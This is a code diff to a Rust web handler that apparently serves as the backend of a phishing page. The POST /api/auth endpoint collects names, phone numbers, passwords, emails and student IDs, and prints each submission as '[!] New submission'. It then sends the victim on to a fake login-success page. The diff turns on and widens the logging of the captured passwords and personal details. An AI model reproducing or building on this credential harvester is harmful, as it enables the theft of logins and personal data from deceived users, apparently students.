@@ -5,19 +5,19 @@ use serde::Deserialize;
 #[derive(Debug, Deserialize)]
 struct InfoForm {
     #[serde(default)]
-    name: Option<String>,
+    name: String,
     #[serde(default)]
-    phone: Option<i64>,
+    phone: i64,
     #[serde(default)]
-    password: Option<String>,
+    password: String,
     #[serde(default)]
-    email: Option<String>,
+    email: String,
     #[serde(default)]
-    id: Option<String>,
+    id: String,
     #[serde(default)]
-    student_id: Option<String>,
+    student_id: String,
     #[serde(default)]
-    agree: Option<String>,
+    agree: String,
 }
 
 #[post("/api/auth")]
@@ -32,17 +32,23 @@ pub async fn submit(req: HttpRequest, form: web::Form<InfoForm>) -> HttpResponse
         println!("{}", "[!] New submission".bright_blue());
         println!("{}", "Warn: unable to get client addr".bright_red())
     }
-    // print!(
-    //     "\t{}: {}\n\t{}: {}\n\t{}: {}\n\t{}: {}\n",
-    //     "Name".bright_red().bold(),
-    //     form.name,
-    //     "Phone".bright_red().bold(),
-    //     form.phone,
-    //     "Student ID".bright_red().bold(),
-    //     form.student_id,
-    //     "Password".bright_red().bold(),
-    //     form.password
-    // );
+    print!(
+        "\t{}: {}\n\t{}: {}\n\t{}: {}\n\t{}: {}\n\t{}: {}\n\t{}: {}\n\t{}: {}\n",
+        "Name".bright_red().bold(),
+        form.name,
+        "Phone".bright_red().bold(),
+        form.phone,
+        "Password".bright_red().bold(),
+        form.password,
+        "ID".bright_red().bold(),
+        form.id,
+        "Email".bright_red().bold(),
+        form.email,
+        "Student ID".bright_red().bold(),
+        form.student_id,
+        "Agree".red(),
+        form.agree,
+    );
     HttpResponse::Found()
         .insert_header((header::LOCATION, "/login/success.html"))
         .finish()
